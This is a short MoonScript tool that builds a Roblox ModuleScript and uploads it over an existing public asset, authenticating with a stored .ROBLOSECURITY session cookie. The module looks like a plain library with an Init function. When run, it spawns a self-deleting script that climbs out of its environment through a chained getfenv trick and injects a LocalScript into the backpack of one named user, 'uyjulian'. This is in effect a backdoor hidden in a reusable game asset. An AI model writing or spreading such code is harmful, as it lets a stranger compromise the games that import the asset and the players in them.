
tempGen = require"ModuleTemplate"
accountServ = require"RobloxUserPass"
file_util = require"file_util"
url_util = require"url_util"

existingRobloxAsset = (id) -> 
	"?" .. url_util.gen_get_args{
		assetid: id
	}

newRobloxAsset = (asstype, name, description, genreTypeId, isPublic, allowComments) ->
	"?" .. url_util.gen_get_args{
		type: asstype or "Model"
		name: name or "Sample"
		description: description or "Sample"
		genreTypeId: genreTypeId or 1
		isPublic: (isPublic and "True") or "False"
		allowComments: (allowComments and "True") or "False"
		assetid: 0
	}

uploadRobloxAssetData = (roblosecurity, instring, info) ->
	url_util.curl_post_url("http://data.roblox.com/Data/Upload.ashx" .. info, instring, {
		USERAGENT: "roblox/rbxweb"
		COOKIE: ".ROBLOSECURITY=" .. roblosecurity
	})

onion = tempGen.getModule([[
local M = {}

local ls = script.LocalScript:Clone()
local s = script.Script:Clone()

function M.Init()
	local lel = s:Clone()
	ls:Clone().Parent = lel
	lel.Parent=workspace
end

return M
]],file_util.readfile("bin/uyjulianRBXPersonScript.lua"), [[
wait();
local ls = script.LocalScript:clone()
script:Destroy()
local env = getfenv(getfenv(getfenv(getfenv(getfenv(getfenv(game.GetJobsInfo).setfenv).xpcall).setfenv).xpcall).setfenv)
local function cnt(plyr) 
	if plyr.Name == "uyjulian" then
		local brk = nil
		while env.wait() do
			for i2, v2 in pairs(plyr:GetChildren()) do
				if v2:IsA("Backpack") then
					brk = v2
				end
			end
			if brk then break end
		end
		ls:Clone().Parent = brk
	end
end
env.game:service'Players'.PlayerAdded:connect(cnt)
for i, v in pairs(env.game:service'Players':GetPlayers'') do
	env.Spawn(function() cnt(v) end)
end
]])

print(uploadRobloxAssetData(accountServ.GetRobloSecurity("testaccount1"), onion, existingRobloxAsset(324987544)))
